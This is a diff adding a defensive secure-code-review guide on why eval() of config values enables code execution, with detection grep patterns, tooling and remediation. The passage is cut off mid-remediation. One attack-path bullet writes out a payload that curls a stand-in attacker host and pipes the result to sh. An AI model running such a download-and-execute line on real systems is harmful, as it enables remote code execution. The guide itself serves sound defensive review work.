@@ -1,0 +1,55 @@
+# Secure Code Review: Why `eval()` on a Config Field Is Unsafe
+
+## The Core Problem
+
+`eval()` treats its argument as **executable code**, not data. A config field is supposed to be *data* — a value the program reads. When you pipe config into `eval()`, you collapse the boundary between "configuration" and "code," and whoever can influence the config can now run arbitrary code in your process.
+
+The vulnerable pattern looks like:
+
+```python
+value = config.get("some_field")
+result = eval(value)          # arbitrary code execution
+```
+
+## Why It's Unsafe (Attack Path)
+
+1. **Config is often attacker-influenced, not trusted.** Config can come from environment variables, mounted files, a database row, a feature-flag service, an admin UI, a `.env` file, or a JSON blob. Any of these can be edited by someone who isn't a developer — or compromised via a dependency, a CI step, or a container image.
+2. **`eval()` executes expressions with full process privileges.** `eval("__import__('os').system('curl attacker/x | sh')")` is valid Python. There's no "sandbox" by default — the executed code runs with the app's user, IAM role, and network access.
+3. **Even "simple" values can be malicious.** A field you think holds `"42"` or `"true"` can instead hold a call, a dunder chain, or a `lambda`. Type isn't enforced before evaluation.
+4. **It defeats every other control.** Static analysis, input validation, and least-privilege reviews assume data stays data. `eval()` turns a low-severity "config injection" into remote code execution (RCE).
+5. **Language-specific pitfalls compound it.** In Python, `eval` vs `exec` differ only in whether statements are allowed — both execute. In JavaScript, `eval` and `new Function()` both compile strings to code; `Function` is *not* a safer substitute. In PHP, `eval` executes PHP source.
+
+## Common Disguises (variants to flag)
+
+- `eval(...)`, `exec(...)`, `compile(...)` followed by `exec`
+- `new Function(configString)()`, `setTimeout("...", ...)` with a string, `vm.runInContext`
+- Template engines in "render arbitrary expression" mode (e.g., Jinja `Environment` without a sandbox, `eval`-style `${...}` in some config parsers)
+- Deserialization that executes: `pickle.loads` on config, `yaml.load` (unsafe loader), `Marshal`, `unserialize` in PHP
+- `getattr(obj, config["method"])()` — dynamic dispatch driven by config is structurally the same risk even without `eval`
+
+## How to Detect It
+
+**Manual review checklist:**
+- Search for `eval`, `exec`, `compile`, `new Function`, `setTimeout(` with a string arg, `vm.`, `pickle.loads`, `yaml.load(`, `unserialize(`.
+- Trace each hit's argument back to its source. If it can originate from config/env/DB/HTTP, it's a finding.
+- Look at config *loading* code, not just obvious call sites — the dangerous call is often one wrapper function away.
+
+**Grep / ripgrep patterns:**
+```bash
+rg -n 'eval\s*\(|exec\s*\(|compile\s*\('
+rg -n 'new\s+Function\s*\(|setTimeout\s*\(\s*["\'`]'
+rg -n 'yaml\.load\s*\([^,]*\)(?![^)]*Loader)'   # unsafe loader
+rg -n 'pickle\.(loads|load)\s*\('
+```
+
+**Tooling:**
+- **Semgrep** rule for `eval` on non-literal input (source-to-sink taint from config readers to `eval`).
+- **Bandit** (`B307` eval, `B301` pickle) for Python.
+- **CodeQL** taint queries (`py/code-injection`, `js/code-injection`) — best for confirming reachability from untrusted sources.
+- **ESLint** `no-eval`, `no-implied-eval` for JS.
+
+The reliable signal is **taint flow**: does a value read from config reach an evaluating sink without being constrained to a fixed allowlist?
+
+## Safe Remediation (what to recommend)
+
+- **Parse, don't execute.** Use format-native parsers: `json.loads`, `int()`, `float()`, `strtobool`, `ast.literal_eval` (literals only — still has DoS edge cases, but no code execution
